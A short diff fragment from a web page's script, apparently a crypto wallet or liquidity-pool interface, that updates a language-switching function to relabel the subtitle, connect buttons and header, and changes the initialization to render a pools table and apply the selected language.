+    let lang = document.getElementById("lang-select").value;
+
+    if(lang === "auto") {
+        lang = detectLanguage();
+    }
+
+    const t = translations[lang] || translations.en;
+
+    document.getElementById("subtitle").textContent = t.subtitle;
+
+    document.querySelectorAll(".wallet-btn,.primary-btn")
+        .forEach(button => {
+            button.textContent = t.connect;
+        });
+
+    document.querySelector(".explore-header h2").textContent =
+        t.explore;
+
 }
 
-// Initialize page language automatically
-applyLanguage("auto");
+/* INITIALIZE */
+
+renderTable(pools);
+switchLanguage();
+
 </script>
 
 </body>
